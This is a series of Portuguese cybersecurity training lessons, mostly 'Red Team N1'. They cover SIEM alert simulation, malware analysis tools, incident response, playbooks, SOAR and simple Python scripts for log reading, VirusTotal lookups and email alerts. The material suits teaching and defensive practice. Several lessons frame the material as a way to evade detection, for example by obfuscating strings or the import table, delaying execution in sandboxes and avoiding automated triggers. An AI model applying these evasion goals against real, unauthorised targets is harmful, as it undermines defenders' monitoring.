# 🔴 Red Team N1: Prática – Simular Alerta no SIEM e Investigar um Falso Positivo

Para entender como sua atividade pode ser detectada (ou ignorada), é essencial praticar a simulação de alertas em um SIEM. Além disso, investigar falsos positivos ajuda a entender como os sistemas defensivos funcionam — e como podem ser enganados.

Teste os limites da detecção para se tornar invisível.

---

## 🧠 Objetivo da prática

- Criar uma atividade que dispare um alerta no SIEM  
- Investigar o alerta como se fosse da equipe Blue  
- Analisar se a detecção foi legítima, um falso positivo ou um erro de configuração  
- Aprender como sua atividade ofensiva é percebida  

---

## 🧱 Etapas da simulação

### 1. Acesse o SIEM

- Pode ser um ambiente com **Splunk**, **Elastic Stack (ELK)** ou outro SIEM acessível  
- Certifique-se de que logs de endpoints ou servidores estejam sendo coletados  

### 2. Simule uma atividade

- Execute uma ação que gere um evento monitorado:
  - Múltiplas tentativas de login (para gerar alerta de brute force)  
  - Execução de um script com `PowerShell`  
  - Alteração de arquivos de sistema  

### 3. Aguarde o alerta

- Verifique se a regra de detecção foi acionada  
- Documente a origem, tipo de evento e resposta do sistema  

### 4. Investigue como se fosse Blue Team

- Acesse o evento no SIEM  
- Analise IPs, usuário, timestamps, comandos executados  
- Determine se foi uma ameaça real ou um falso positivo  

---

## 🔍 O que observar

```
- Quais campos do evento foram analisados pelo SIEM?  
- O alerta foi acionado por comportamento ou por assinatura?  
- A ação foi maliciosa ou legítima (falso positivo)?  
- O que poderia ser feito para evitar ou atrasar o alerta?  
```

---

## ✅ Conclusão

Praticar a simulação de alertas e a investigação de falsos positivos fortalece a visão do Red Team sobre como suas ações são vistas pelos defensores. Com esse conhecimento, é possível adaptar táticas para ser mais furtivo e eficaz.

---

# 🔴 Red Team N1: Conceitos Básicos de Análise Estática – Strings, Hashes, Import Table

A análise estática é uma técnica fundamental para examinar arquivos suspeitos **sem executá-los**. Ela permite extrair informações úteis que podem revelar comportamentos maliciosos, indicadores de comprometimento e até mesmo vulnerabilidades exploráveis.

Aprenda a dissecar arquivos com precisão cirúrgica.

---

## 🧠 O que é Análise Estática?

- Análise de arquivos (geralmente executáveis) **sem execução direta**  
- Foca em identificar padrões, strings, funções, estrutura e metadados  
- Útil para reconhecer rapidamente funcionalidades maliciosas  
- Complementa a análise dinâmica com dados prévios à execução  

---

## 🧱 Elementos Essenciais

### 1. **Strings**

- Texto codificado dentro de arquivos binários  
- Podem revelar URLs, comandos, nomes de arquivos, credenciais ou mensagens ocultas  
- Ferramentas como `strings` (Linux) ou `bintext` mostram essas informações  
- Ajuda a identificar comportamentos maliciosos rapidamente  

### 2. **Hashes**

- Impressões digitais únicas de arquivos  
- SHA256, MD5 e SHA1 são os mais usados  
- Permitem verificar integridade, detectar variantes e buscar em bancos como VirusTotal  
- Compara arquivos com malwares conhecidos  

### 3. **Import Table (IAT)**

- Lista de funções e bibliotecas que o binário usa  
- Indica **quais APIs** do sistema o arquivo pretende usar (ex: `CreateProcess`, `InternetOpenUrl`)  
- Forte indicador do comportamento pretendido: rede, execução, manipulação de memória  
- Ferramentas como PEStudio e Ghidra ajudam a visualizar a IAT  

---

## 🔍 Aplicação prática

```
- Use `strings malware.exe > out.txt` para extrair textos suspeitos  
- Gere um hash com `sha256sum malware.exe` e busque no VirusTotal  
- Analise a import table com ferramentas como PEStudio para ver se há chamadas suspeitas à API  
```

---

## ⚙️ Por que importa para o Red Team?

- Ajudar a entender e modificar malwares (para simulações ou PoCs)  
- Criar payloads mais eficazes e furtivos  
- Detectar como a análise defensiva enxerga seus arquivos  
- Preparar contra-análises: como evitar strings explícitas ou ofuscar a IAT  

---

## ✅ Conclusão

Dominar a análise estática é um passo essencial no arsenal do Red Team N1. Com ferramentas simples e um olhar atento, você pode obter informações poderosas sem sequer executar o código malicioso.

---

# 🔴 Red Team N1: Introdução à Análise Dinâmica com Sandboxes

A análise dinâmica permite observar **o que um arquivo realmente faz quando é executado**. Em ambientes seguros chamados sandboxes, é possível estudar malwares e payloads sem colocar em risco o sistema. Essa técnica é essencial para entender o comportamento real de ameaças.

Assista o malware agir sem arriscar sua máquina.

---

## 🧠 O que é Análise Dinâmica?

- Técnica que **executa** o arquivo em um ambiente isolado (sandbox)  
- Permite observar ações em tempo real: criação de arquivos, conexões de rede, processos, modificações no sistema  
- Detecta comportamento oculto ou condicional que não aparece na análise estática  
- Ideal para capturar IOCs (hashes, IPs, domínios, strings) e verificar evasão  

---

## 🧱 Ferramentas Populares de Sandbox

- **AnyRun:** sandbox interativa com visualização em tempo real  
- **Hybrid Analysis:** sandbox automatizada com múltiplos mecanismos de detecção  
- **CAPEv2:** ferramenta open source com foco em extração de payloads e comportamento de malware  

---

## 🔍 Como funciona a análise dinâmica

```
1. Envie o arquivo suspeito para a sandbox (via upload ou link)  
2. A sandbox executa o arquivo em uma VM monitorada  
3. É coletado o comportamento: arquivos criados, conexões abertas, processos chamados  
4. O relatório mostra indicadores técnicos e insights de execução maliciosa  
```

---

## ⚙️ Por que importa para o Red Team?

- Avaliar se seus payloads disparam alertas comportamentais  
- Testar estratégias de evasão: delay na execução, verificação de ambiente virtual  
- Inspirar-se em malwares reais para desenvolver simulações mais eficazes  
- Compreender como o Blue Team coleta evidências a partir do comportamento  

---

## ✅ Conclusão

A análise dinâmica com sandboxes é uma ferramenta poderosa no kit do Red Team N1. Ela permite observar malwares e arquivos maliciosos em ação, revelar detalhes críticos e fortalecer o desenvolvimento de técnicas ofensivas furtivas e sofisticadas.

---

# 🔴 Red Team N1: Ferramentas para Análise Básica – PEStudio, x64dbg, Ghidra

No Red Team, entender como funcionam arquivos executáveis é essencial. Ferramentas como **PEStudio**, **x64dbg** e **Ghidra** ajudam a fazer uma análise estática e reversa inicial de malwares e payloads, mesmo sem executar o código diretamente.

Conheça o que acontece por trás do clique duplo.

---

## 🧠 Por que usar essas ferramentas?

- Realizam **análise estática e reversa** sem executar o arquivo  
- Permitem identificar funções suspeitas, imports, strings e estruturas internas  
- Ajudam a entender como o malware opera e a desenvolver técnicas de evasão  
- São base para engenharia reversa, modificação e criação de simulações  

---

## 🧱 Ferramentas Essenciais

### 1. **PEStudio**

- Ferramenta leve para análise estática de executáveis Windows (PE)  
- Mostra imports, exports, strings, hashes, seções e indicadores de anomalias  
- Detecta presença de ofuscação, packers ou chamadas suspeitas  
- Ideal para uma análise rápida e inicial  

🔗 [https://www.winitor.com/](https://www.winitor.com/)

---

### 2. **x64dbg**

- Debugger de código aberto para Windows (x86/x64)  
- Permite executar o programa passo a passo (debug)  
- Útil para encontrar **pontos de execução**, comportamento em tempo real e evasões  
- Excelente para analisar malware com técnicas anti-debug ou anti-VM  

🔗 [https://x64dbg.com/](https://x64dbg.com/)

---

### 3. **Ghidra**

- Ferramenta de engenharia reversa desenvolvida pela NSA  
- Faz disassembly e decompilação de código binário  
- Permite entender a lógica interna do programa sem código-fonte  
- Suporta vários formatos e arquiteturas, ideal para análise avançada  

🔗 [https://ghidra-sre.org/](https://ghidra-sre.org/)

---

## 🔍 Exemplo de uso combinado

```
- Use o **PEStudio** para entender as características gerais do binário (funções importadas, indicadores de risco)  
- Analise com o **x64dbg** como o binário se comporta durante a execução, encontrando pontos de interesse  
- Reforce com o **Ghidra** para estudar a lógica interna e identificar funções maliciosas ou criptografia  
```

---

## ⚙️ Aplicações no Red Team

- Estudar malwares reais para simular ameaças mais realistas  
- Criar payloads mais furtivos com base em engenharia reversa  
- Identificar e testar pontos de evasão de EDR e SIEM  
- Treinar análise defensiva como forma de antecipar detecção  

---

## ✅ Conclusão

Dominar ferramentas como PEStudio, x64dbg e Ghidra permite ao Red Team N1 explorar binários com profundidade, entender ameaças reais e criar ataques mais estratégicos. Esses conhecimentos abrem as portas da engenharia reversa e da análise avançada.

---

# 🔴 Red Team N1: Prática – Analisar Sample Simples (Malware em Sandbox)

Nada substitui a prática. Analisar uma amostra de malware real (com segurança) em uma sandbox é uma ótima forma de treinar o olhar técnico, identificar comportamentos maliciosos e entender como os sistemas de defesa reagem.

Veja o malware em ação — sem arriscar seu sistema.

---

## 🧠 Objetivo do exercício

- Submeter uma amostra simples de malware a uma sandbox online  
- Observar e interpretar o comportamento dinâmico da amostra  
- Coletar indicadores de comprometimento (IOCs)  
- Treinar a leitura de relatórios técnicos de análise  

---

## 🧱 Ambiente necessário

- Navegador com acesso à internet  
- Conta gratuita em alguma plataforma de sandbox (ex: AnyRun ou Hybrid Analysis)  
- Amostra pública e segura (ex: link do MalwareBazaar, arquivo inofensivo com comportamento simulado)  

> **⚠️ Dica de segurança:** nunca execute malwares reais fora de ambientes controlados e isolados.

---

## 🔍 Etapas da prática

```
1. Acesse [https://any.run/](https://any.run/) ou [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)  
2. Submeta uma amostra simples, como um `.exe` suspeito ou `.docm` com macro  
3. Acompanhe a análise em tempo real (AnyRun) ou aguarde o relatório (Hybrid)  
4. Identifique:
   - Processos criados  
   - Conexões de rede realizadas  
   - Arquivos modificados ou criados  
   - Strings e URLs visíveis  
5. Exporte o relatório e destaque os IOCs mais relevantes  
```

---

## ⚙️ Como interpretar os resultados

- Atividade de rede: conexões para IPs ou domínios maliciosos  
- Processos: execução de scripts ou binários inusitados  
- Arquivos: payloads dropados ou arquivos do sistema alterados  
- Técnicas: indícios de evasão, persistência ou escalonamento  

---

## ✅ Conclusão

Analisar uma amostra real em sandbox ajuda o Red Team N1 a entender como os ataques se comportam em nível técnico. Esse exercício reforça sua capacidade de interpretar ameaças e aplicar conhecimento ofensivo com mais precisão.

---

# 🔴 Red Team N1: Entenda o Ciclo de Resposta a Incidentes

Todo ataque gera uma reação. O ciclo de resposta a incidentes é a espinha dorsal das ações defensivas em um ambiente corporativo. Para o Red Team, entender esse processo é essencial para planejar ataques mais realistas, cronometrados e furtivos.

Conheça o jogo do outro lado — para jogar melhor.

---

## 🧠 O que é o ciclo de resposta a incidentes?

- Conjunto de etapas estruturadas para detectar, responder e recuperar de incidentes de segurança  
- Segue frameworks como NIST 800-61, adotado globalmente  
- Envolve múltiplas áreas: segurança, infraestrutura, gestão e jurídico  
- Ajuda a minimizar impacto, conter ameaças e prevenir recorrência  

---

## 🧱 Etapas do ciclo

### 1. **Preparação**

- Documentação de políticas, planos de resposta, playbooks  
- Treinamento de equipe, definição de papéis e responsabilidades  
- Configuração de ferramentas (SIEM, EDR, SOAR) e coleta de logs  

### 2. **Detecção e Análise**

- Identificação de eventos suspeitos por alertas, sensores, usuários  
- Análise técnica para confirmar se é um incidente real  
- Classificação da severidade, escopo e vetores envolvidos  

### 3. **Contenção**

- Isolamento do sistema afetado para limitar propagação  
- Uso de firewalls, regras em EDR/SIEM, bloqueio de contas ou redes  
- Contenção pode ser temporária ou de longo prazo  

### 4. **Erradicação**

- Eliminação do agente malicioso (malware, usuário, acesso indevido)  
- Correção de vulnerabilidades exploradas  
- Revisão de indicadores de comprometimento (IOCs)  

### 5. **Recuperação**

- Restauração de serviços, sistemas e operações  
- Validação de integridade e monitoramento contínuo  
- Retorno controlado ao ambiente de produção  

### 6. **Lições Aprendidas**

- Documentação do incidente, análise de falhas e melhorias  
- Atualização de políticas, regras de detecção e processos  
- Compartilhamento interno de conhecimento  

---

## 🔍 Como isso impacta o Red Team?

```
- Saber quando e como o Blue Team detecta suas ações  
- Planejar ataques com base no tempo de resposta e cobertura de monitoramento  
- Simular falhas reais para treinar e testar o ciclo de resposta da organização  
- Usar o ciclo como referência para criar exercícios realistas de Purple Team  
```

---

## ✅ Conclusão

Compreender o ciclo de resposta a incidentes é um diferencial para o Red Team N1. Isso permite criar ataques mais eficazes, contribuir com simulações e evoluir como profissional estratégico e colaborativo.

---

# 🔴 Red Team N1: Como Criar e Usar Playbooks para Automação e Padronização

Playbooks são documentos operacionais que descrevem **passo a passo** como responder a determinados eventos ou realizar ações específicas. Para o Red Team, entender e até simular playbooks defensivos é essencial para prever comportamentos, criar contramedidas e melhorar a comunicação com Blue Teams e SOCs.

Automatize. Padronize. E então pense como quebrar.

---

## 🧠 O que é um playbook?

- Um **roteiro operacional estruturado** que define como reagir a um tipo específico de evento de segurança  
- Pode ser **manual, semiautomático ou totalmente automatizado** (via SOAR, scripts etc.)  
- Define **quem faz o quê**, **quando** e **como**, com base em regras pré-estabelecidas  
- Usado tanto em resposta a incidentes quanto em operações ofensivas (simulações, coleta, exploração)  

---

## 🧱 Estrutura básica de um playbook

### 1. **Título e objetivo**
- Ex: “Resposta a alerta de execução de PowerShell suspeito”  
- Define a finalidade e o escopo da ação  

### 2. **Critérios de ativação**
- Quais eventos ou alertas disparam esse playbook  
- Ex: evento no SIEM, hash suspeito detectado, log de login anômalo  

### 3. **Passos detalhados**
- Ações ordenadas e claras para lidar com o evento  
- Ex: coletar artefatos, isolar host, consultar IOC, acionar times  

### 4. **Ferramentas envolvidas**
- Ex: SIEM, EDR, SOAR, scripts em Python, Powershell  

### 5. **Pontos de decisão**
- Quando escalar, interromper, seguir adiante ou automatizar  
- Ex: “se o hash estiver no VT com score >80, isole o host”  

### 6. **Pós-ação**
- Documentar, notificar, atualizar regras ou criar ticket  

---

## 🔍 Aplicações para o Red Team

```
- Estudar os playbooks defensivos para prever como sua atividade será tratada  
- Criar seus próprios playbooks ofensivos para padronizar fases do ataque (recon, exploração, pós-exploração)  
- Automatizar tarefas repetitivas com scripts e ferramentas (ex: coleta de credenciais, enumeração de portas)  
- Treinar simulações mais realistas baseadas na resposta defensiva esperada  
```

---

## ⚙️ Ferramentas úteis

- **SOARs** como Splunk Phantom, Cortex XSOAR, Microsoft Sentinel (Playbooks com Logic Apps)  
- **Automação via scripts:** Bash, PowerShell, Python com APIs de EDR, SIEM, firewall  
- **Versionamento:** Git para versionar e compartilhar playbooks de Red Team  

---

## ✅ Conclusão

Criar e usar playbooks é uma habilidade fundamental para o Red Team N1. Além de organizar ações ofensivas, isso ajuda a antecipar respostas do Blue Team e a operar de forma mais eficiente, automatizada e colaborativa.

---

# 🔴 Red Team N1: Prática – Montar um Playbook Simples para Resposta a Phishing

Phishing continua sendo um dos vetores mais comuns de ataque. Para o Red Team, conhecer (e simular) como o Blue Team reage a esses ataques é essencial. Criar um playbook de resposta ajuda a entender os pontos de reação, detecção e contenção — e onde você pode atuar para testar a maturidade da equipe defensiva.

---

## 🧠 Objetivo do exercício

- Criar um **playbook básico** e realista de resposta a e-mails de phishing  
- Simular um cenário prático: phishing com anexo malicioso ou link falso  
- Padronizar os passos da investigação e contenção  

---

## 🧱 Estrutura do playbook: Resposta a Phishing

### 🎯 **Nome do Playbook:**  
Resposta a Incidente de Phishing com Anexo Malicioso

### 🔁 **Critério de Ativação:**  
Alerta no SIEM ou relato de usuário indicando possível phishing

---

## 🔍 Etapas do Playbook

```
### 1. Coleta de informações iniciais  
- Obter cópia do e-mail suspeito  
- Verificar remetente, assunto, data/hora e conteúdo  
- Identificar link ou anexo presente no corpo do e-mail  

### 2. Análise do artefato  
- Se houver link: verificar reputação (VirusTotal, urlscan.io)  
- Se houver anexo: analisar em sandbox (AnyRun, Hybrid Analysis)  
- Observar comportamento malicioso, criação de arquivos, conexões, etc.  

### 3. Contenção  
- Bloquear link no proxy/firewall se confirmado malicioso  
- Isolar máquina do usuário se houver execução do anexo  
- Revogar credenciais comprometidas (caso haja login suspeito)  

### 4. Comunicação  
- Avisar equipe de TI, gestão e áreas impactadas  
- Comunicar o usuário e oferecer orientação  

### 5. Erradicação e recuperação  
- Remover malware (se necessário)  
- Reconfigurar acessos, restaurar backups  
- Monitorar por novas tentativas semelhantes  

### 6. Documentação e lições aprendidas  
- Registrar o incidente no sistema interno (ticket, relatório)  
- Atualizar regras de detecção no SIEM e EDR  
- Reforçar conscientização com base no caso real  
```

---

## ⚙️ Ferramentas úteis

- SIEM (Splunk, Elastic) para detectar e rastrear e-mails maliciosos  
- Sandbox (AnyRun, Hybrid Analysis) para analisar anexos  
- EDR para isolar endpoints e buscar persistência  
- Serviços de reputação (VirusTotal, AbuseIPDB, urlscan.io)  
- Scripts para extração de IOC e automação de análise básica  

---

## ✅ Conclusão

Montar um playbook simples de resposta a phishing ajuda o Red Team N1 a entender o fluxo defensivo e criar simulações mais realistas. A prática permite visualizar o tempo de resposta, os pontos de falha e oportunidades de evasão.

---

# 🔴 Red Team N1: Fundamentos Básicos de Python – Variáveis, Loops e Funções

Python é uma das linguagens mais usadas no Red Team, seja para automação, criação de ferramentas, exploits ou engenharia reversa. Dominar a base da linguagem é essencial para evoluir na área ofensiva com mais controle e agilidade.

Automatize hoje, ataque melhor amanhã.

---

## 🧠 Por que aprender Python no Red Team?

- Permite criar scripts rápidos para tarefas como coleta de dados, brute force, automação de análise  
- Base para ferramentas famosas como `Impacket`, `Scapy`, `pwntools`, entre outras  
- Facilita integração com APIs, SIEMs, firewalls e SOARs  
- Essencial para customizar exploits, payloads e módulos  

---

## 🧱 Fundamentos que você precisa dominar

### 📌 1. Variáveis

Armazenam valores para uso posterior.

```
ip = "192.168.0.1"
porta = 22
print("Alvo:", ip, "na porta", porta)
```

---

### 🔁 2. Loops

Executam ações repetidas vezes. `for` e `while` são os mais usados.

```
# Tentativa simples de brute force
senhas = ["123456", "admin", "senha123"]
for senha in senhas:
    print("Testando senha:", senha)
```

---

### ⚙️ 3. Funções

Blocos reutilizáveis de código.

```
def scan_porta(ip, porta):
    print(f"Escaneando {ip}:{porta}...")

scan_porta("192.168.0.10", 80)
```

---

## 🛠️ Prática simples

```
- Escreva um script que leia uma lista de IPs e imprima cada um  
- Faça um loop que teste senhas de um dicionário básico  
- Crie uma função que gere um alerta simulado (ex: “Acesso suspeito detectado”)  
```

---

## 🔐 Aplicações no Red Team

- Scripts para enumeração e fuzzing  
- Automações de coleta de dados durante o reconhecimento  
- Geração de payloads, shells reversos e simulação de ataques  
- Criação de ferramentas customizadas para pentest interno  

---

## ✅ Conclusão

Aprender os fundamentos de Python coloca o Red Team N1 em vantagem. É o primeiro passo para transformar tarefas manuais em automações eficazes e evoluir para níveis mais técnicos, com domínio de ferramentas próprias.

---

# 🔴 Red Team N1: Scripts para Leitura de Logs e Integração com APIs de Segurança

Automatizar a coleta e análise de logs, bem como a integração com APIs de segurança, é fundamental para o Red Team aprimorar suas ações, identificar padrões e criar simulações realistas. Dominar scripts para essas tarefas aumenta a eficiência e permite escalar operações ofensivas.

---

## 🧠 Por que usar scripts para logs e APIs?

- Facilita a leitura e filtragem de grandes volumes de logs  
- Permite automatizar consultas a APIs (EDR, SIEM, Threat Intelligence)  
- Ajuda a identificar indicadores de comprometimento (IOCs) rapidamente  
- Suporta criação de workflows automatizados para coleta e resposta  

---

## 🧱 Conceitos básicos

- Logs podem estar em arquivos locais ou em sistemas remotos (via API, Syslog, etc.)  
- APIs comuns incluem VirusTotal, CrowdStrike, Microsoft Defender, entre outras  
- Bibliotecas Python úteis: `requests` (para HTTP), `json` (para dados), `os` e `re` (para manipulação de arquivos e regex)  

---

## 🔍 Exemplo 1: Leitura simples de logs (arquivo local)

```
with open("security.log", "r") as arquivo:
    for linha in arquivo:
        if "erro" in linha.lower() or "falha" in linha.lower():
            print("Alerta encontrado:", linha.strip())
```

---

## 🔍 Exemplo 2: Consulta simples a API VirusTotal

```
import requests

api_key = "SUA_API_KEY"
file_hash = "44d88612fea8a8f36de82e1278abb02f"  # Exemplo MD5 de arquivo

url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
headers = {"x-apikey": api_key}

resposta = requests.get(url, headers=headers)

if resposta.status_code == 200:
    dados = resposta.json()
    print("Detecção VT:", dados["data"]["attributes"]["last_analysis_stats"])
else:
    print("Erro na consulta:", resposta.status_code)
```

---

## 🔍 Exemplo 3: Integração básica para automatizar alertas

```
def checar_iocs_em_log(log_path, iocs):
    with open(log_path, "r") as log:
        for linha in log:
            for ioc in iocs:
                if ioc in linha:
                    print(f"IOC {ioc} detectado na linha: {linha.strip()}")

iocs_suspeitos = ["192.168.1.100", "malicioso.com", "abc123hash"]

checar_iocs_em_log("security.log", iocs_suspeitos)
```

---

## ⚙️ Aplicações no Red Team

- Criar ferramentas personalizadas para reconhecimento e pós-exploração  
- Automatizar coleta de evidências e busca por indicadores  
- Simular ataques e validar se alertas são gerados corretamente  
- Integrar com SOAR para acelerar respostas ofensivas  

---

## ✅ Conclusão

Scripts para leitura de logs e integração com APIs de segurança ampliam o alcance e a eficácia do Red Team. São essenciais para transformar dados brutos em inteligência útil e para escalar operações de forma automatizada.

---

# 🔴 Red Team N1: Prática – Criar Script para Coletar Alertas e Enviar Notificação Simples

Automatizar a coleta de alertas e a notificação é fundamental para ganhar agilidade no Red Team. Este exercício vai ajudar você a criar um script básico que lê um arquivo de log, identifica alertas e envia uma notificação simples via e-mail.

---

## 🧠 Objetivo do exercício

- Criar um script Python para monitorar alertas em logs  
- Enviar notificação automática quando alertas forem detectados  
- Entender integração básica com serviços de e-mail via SMTP  

---

## 🧱 Ambiente necessário

- Python 3 instalado  
- Conta de e-mail para envio via SMTP (ex: Gmail)  
- Arquivo de log local com eventos para monitorar  

---

## 🔍 Exemplo de script

```
import smtplib
from email.mime.text import MIMEText

def enviar_email(mensagem, destinatario):
    smtp_servidor = "smtp.gmail.com"
    smtp_porta = 587
    usuario = "seu_email@gmail.com"
    senha = "sua_senha_app"  # Use senha de app para Gmail

    msg = MIMEText(mensagem)
    msg["Subject"] = "Alerta de Segurança Detectado"
    msg["From"] = usuario
    msg["To"] = destinatario

    with smtplib.SMTP(smtp_servidor, smtp_porta) as server:
        server.starttls()
        server.login(usuario, senha)
        server.send_message(msg)
    print("Email enviado para", destinatario)

def coletar_alertas_e_notificar(log_path, destinatario):
    alertas = []
    with open(log_path, "r") as arquivo:
        for linha in arquivo:
            if "ALERTA" in linha.upper():
                alertas.append(linha.strip())

    if alertas:
        mensagem = "\n".join(alertas)
        enviar_email(mensagem, destinatario)
    else:
        print("Nenhum alerta encontrado.")

if __name__ == "__main__":
    coletar_alertas_e_notificar("security.log", "destinatario@exemplo.com")
```

---

## ⚙️ Dicas para aprimorar

- Use variáveis de ambiente para guardar credenciais com segurança  
- Integre com APIs de serviços de mensagens (Slack, Teams, Telegram)  
- Automatize a execução periódica com cron jobs ou agendadores  

---

## ✅ Conclusão

Criar scripts simples de coleta e notificação é o primeiro passo para automação ofensiva eficaz. Com esse conhecimento, o Red Team pode acelerar o fluxo de informações e agir rapidamente conforme os alertas.

---

# 🔴 Red Team N1: Conceitos de Integração entre Ferramentas de Segurança

No cenário atual de segurança cibernética, a integração eficiente entre diferentes ferramentas é essencial para criar um ecossistema robusto, automatizado e responsivo. Para o Red Team, entender essas integrações ajuda a planejar ataques que exploram falhas nos fluxos de informação e identificar pontos para simulação mais realistas.

---

## 🧠 Por que integrar ferramentas?

- Centralizar dados para melhor correlação e análise  
- Automatizar respostas a incidentes com menos intervenção manual  
- Reduzir o tempo de detecção e mitigação  
- Garantir que alertas e informações relevantes cheguem rapidamente às equipes certas  

---

## 🧱 Principais tipos de integração

### 1. **API (Application Programming Interface)**

- Permite comunicação entre sistemas via protocolos padrão (REST, SOAP)  
- Facilita envio e recebimento de dados em formato estruturado (JSON, XML)  
- Exemplo: SIEM consulta logs via API de EDR para enriquecer alertas  

### 2. **Syslog e Logs Centralizados**

- Ferramentas enviam logs para servidores centralizados (ex: ELK Stack)  
- Permite análise e correlação em larga escala  
- Exemplo: Firewalls enviam logs para SIEM  

### 3. **Webhooks**

- Notificações em tempo real disparadas por eventos específicos  
- Integrações leves e rápidas para alertas instantâneos  
- Exemplo: SOAR recebe webhook de um EDR para iniciar playbook  

### 4. **Automação via SOAR (Security Orchestration, Automation and Response)**

- Plataforma que orquestra múltiplas ferramentas e processos  
- Executa playbooks automatizados para resposta rápida  
- Exemplo: SOAR coleta IOC de sandbox, bloqueia IP no firewall e abre ticket  

---

## 🔍 Exemplos práticos de integração

```
- **SIEM + EDR:** SIEM recebe alertas do EDR e correlaciona com logs de rede para detectar ataques avançados  
- **Sandbox + SOAR:** Sandbox envia relatório para SOAR, que automatiza análise e resposta  
- **Firewall + Threat Intelligence:** Firewall atualiza regras automaticamente com IOCs vindos de feeds TI  
- **Ticketing + Monitoramento:** Alertas geram tickets automaticamente para fluxo de resposta  

---

## ⚙️ Benefícios para o Red Team

```
- Entender as integrações permite identificar pontos fracos e janelas de ataque  
- Criar simulações mais realistas que acionem várias ferramentas em cadeia  
- Aproveitar APIs para coletar informações e ajustar estratégias ofensivas  
- Contribuir para exercícios de Purple Team com conhecimento das respostas automatizadas  
```

---

## ✅ Conclusão

Compreender os conceitos de integração entre ferramentas é essencial para o Red Team avançar na criação de ataques sofisticados e para colaborar com o Blue Team em simulações e melhorias contínuas.

---

# 🔴 Red Team N1: Introdução a SOAR e Playbooks Automatizados

SOAR (Security Orchestration, Automation and Response) é uma tecnologia que integra diversas ferramentas de segurança para automatizar processos, orquestrar fluxos de trabalho e acelerar respostas a incidentes. Para o Red Team, conhecer SOAR ajuda a entender como o Blue Team automatiza defesas e como planejar ataques que possam contornar essas automações.

---

## 🧠 O que é SOAR?

- Plataforma que une **orquestração**, **automação** e **resposta**  
- Permite criar **playbooks** que executam ações automáticas baseadas em regras  
- Integra ferramentas como SIEM, EDR, firewalls, sandboxes, e APIs diversas  
- Facilita o trabalho da equipe de segurança, reduzindo erros e tempo de reação  

---

## 🧱 Componentes principais do SOAR

### 1. **Orquestração**

- Coordena múltiplas ferramentas e processos para uma resposta integrada  
- Exemplo: receber alerta no SIEM e disparar coleta de artefatos no EDR  

### 2. **Automação**

- Executa tarefas repetitivas automaticamente, como bloqueios e consultas  
- Exemplo: bloquear IP malicioso no firewall sem intervenção humana  

### 3. **Resposta**

- Gera ações concretas, desde isolamento de host até abertura de tickets  
- Permite responder a incidentes com agilidade e padronização  

---

## 🔍 O que são playbooks automatizados?

```
- Documentos estruturados que definem **passos sequenciais** para tratar incidentes  
- Podem ser manuais, semiautomáticos ou totalmente automatizados via SOAR  
- Definem regras, condições, ações e notificações  
- Exemplo: playbook para resposta a phishing que analisa e-mail, bloqueia anexos e alerta equipe  
```

---

## ⚙️ Benefícios para o Red Team

```
- Entender playbooks ajuda a prever e testar a resposta automatizada do Blue Team  
- Permite planejar ataques que evitem gatilhos automáticos  
- Possibilita colaborar em exercícios de Purple Team com simulações reais  
- Oferece insights para criar scripts que interajam com SOARs em ofensiva  
```

---

## ✅ Conclusão

Conhecer SOAR e playbooks automatizados é fundamental para o Red Team N1 que quer atuar estrategicamente. Isso amplia a visão do ciclo de defesa e prepara o profissional para ambientes cada vez mais automatizados e integrados.

---

# 🔴 Red Team N1: Prática – Simular Integração Simples para Resposta Automatizada

A prática de integrar ferramentas e automatizar respostas é essencial para o Red Team entender os mecanismos de defesa do Blue Team e aprimorar suas técnicas. Neste exercício, você vai criar uma integração básica simulando uma resposta automatizada a um alerta de segurança.

---

## 🧠 Objetivo do exercício

- Simular a recepção de um alerta (ex: arquivo malicioso detectado)  
- Automatizar uma ação simples (ex: bloquear IP suspeito)  
- Entender fluxo básico de orquestração e automação  

---

## 🧱 Cenário simplificado

- Alerta gerado por um sistema de detecção (log, arquivo JSON, webhook)  
- Script que lê o alerta e executa uma ação de contenção (ex: print, atualização de firewall fictício)  

---

## 🔍 Exemplo de script Python

```
import json

# Função simulada para bloquear IP (substitua por integração real)
def bloquear_ip(ip):
    print(f"[AÇÃO] IP {ip} bloqueado no firewall.")

# Simula recebimento de alerta em JSON
alerta_json = '''
{
    "evento": "detecção de malware",
    "ip_suspeito": "192.168.10.100",
    "arquivo": "malware.exe",
    "ação": "bloquear_ip"
}
'''

def processar_alerta(alerta_str):
    alerta = json.loads(alerta_str)
    if alerta.get("ação") == "bloquear_ip":
        ip = alerta.get("ip_suspeito")
        bloquear_ip(ip)
    else:
        print("Nenhuma ação configurada para este alerta.")

if __name__ == "__main__":
    processar_alerta(alerta_json)
```

---

## ⚙️ Como expandir esta simulação

- Integrar com APIs reais de firewall ou EDR  
- Criar listener para receber alertas via webhook ou fila de mensagens  
- Adicionar logging, notificações e registro de eventos  
- Implementar playbooks mais complexos com múltiplas etapas  

---

## ✅ Conclusão

Simular integrações simples é um excelente ponto de partida para entender como funciona a automação de respostas no ambiente de segurança. Com isso, o Red Team pode antecipar defesas e aprimorar seus ataques.

---

# 🔵 Blue Team N1: Princípios de Segmentação e Microsegmentação

Segmentação e microsegmentação são estratégias fundamentais para proteger redes, limitar movimentos laterais de invasores e aumentar a segurança do ambiente. No Blue Team N1, entender esses conceitos ajuda a construir defesas robustas e reduzir riscos.

---

## 🧠 O que é segmentação?

- Dividir a rede em segmentos lógicos ou físicos separados  
- Controlar tráfego entre segmentos usando firewalls, VLANs ou ACLs  
- Limitar o alcance de ataques e facilitar a aplicação de políticas de segurança  

---

## 🧱 O que é microsegmentação?

- Segmentação granular dentro de um segmento maior, até o nível de workloads ou aplicações  
- Usa controles mais precisos (ex: políticas baseadas em identidade, tags, contextos)  
- Pode ser aplicada em ambientes físicos, virtuais e em cloud  

---

## 🔍 Benefícios da segmentação e microsegmentação

```
- Redução do risco de movimentação lateral após comprometimento  
- Maior visibilidade e controle do tráfego interno  
- Aplicação de políticas específicas para diferentes ativos e usuários  
- Melhoria na conformidade com regulamentos de segurança  
```

---

## ⚙️ Exemplos práticos

- Separar a rede administrativa da rede dos usuários finais  
- Isolar servidores críticos em zonas restritas com regras rígidas  
- Implementar firewalls internos para bloquear tráfego entre aplicações diferentes  
- Usar microsegmentação em ambientes de container (ex: Kubernetes Network Policies)  

---

## ✅ Boas práticas

```
- Mapear bem os ativos e dependências antes de segmentar  
- Definir regras “deny by default” e liberar apenas o necessário  
- Monitorar tráfego e ajustar políticas com base em comportamento real  
- Automatizar a criação e gerenciamento de políticas com ferramentas de orquestração  
```

---

## ✅ Conclusão

